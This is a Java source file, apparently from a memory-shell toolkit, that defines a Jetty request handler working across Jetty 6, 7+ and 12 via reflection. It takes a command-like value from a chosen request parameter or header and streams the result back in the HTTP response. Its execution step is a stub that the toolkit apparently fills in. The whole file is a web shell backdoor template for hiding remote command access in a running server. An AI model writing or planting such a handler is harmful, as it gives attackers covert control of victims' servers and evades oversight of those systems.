package com.reajason.javaweb.memshell.shelltool.command;

import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.Response;
import org.eclipse.jetty.util.Callback;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.Scanner;

import static java.nio.charset.StandardCharsets.UTF_8;

/**
 * @author ReaJason
 * @since 2025/11/29
 */
public class CommandJettyHandler {
    private static String paramName;
    private Handler nextHandler;

    public CommandJettyHandler() {
    }

    public boolean handle(Object request, Object response) {
        try {
            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (p == null || p.isEmpty()) {
                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                outputStream.flush();
                outputStream.close();
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    // jetty12
    public boolean handle(Request request, Response response, Callback callback) throws Exception {
        try {
            Object parameters = Request.class.getMethod("extractQueryParameters", Request.class, Charset.class).invoke(null, request, UTF_8);
            String p = (String) invokeMethod(parameters, "getValue", new Class[]{String.class}, new Object[]{paramName});
            if (p == null || p.isEmpty()) {
                Object headers = invokeMethod(request, "getHeaders");
                p = (String) invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{paramName});
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                ByteBuffer content = UTF_8.encode(new Scanner(inputStream).useDelimiter("\\A").next());
                invokeMethod(response, "setStatus", new Class[]{int.class}, new Object[]{200});
                invokeMethod(response, "write", new Class[]{boolean.class, ByteBuffer.class, Callback.class}, new Object[]{true, content, callback});
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return nextHandler.handle(request, response, callback);
    }

    // jetty6
    public void handle(String target, HttpServletRequest request, HttpServletResponse response, int dispatch) throws IOException, ServletException {
        if (handle(request, response)) {
            invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            return;
        }
        if (nextHandler != null) {
            nextHandler.handle(target, request, response, dispatch);
        }
    }

    // jetty7+
    public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        if (handle(request, response)) {
            invokeMethod(baseRequest, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            return;
        }
        if (nextHandler != null) {
            nextHandler.handle(target, baseRequest, request, response);
        }
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName) {
        return invokeMethod(obj, methodName, null, null);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + (obj instanceof Class ? ((Class<?>) obj).getName() : obj.getClass().getName()) + "." + methodName, e);
        }
    }
}
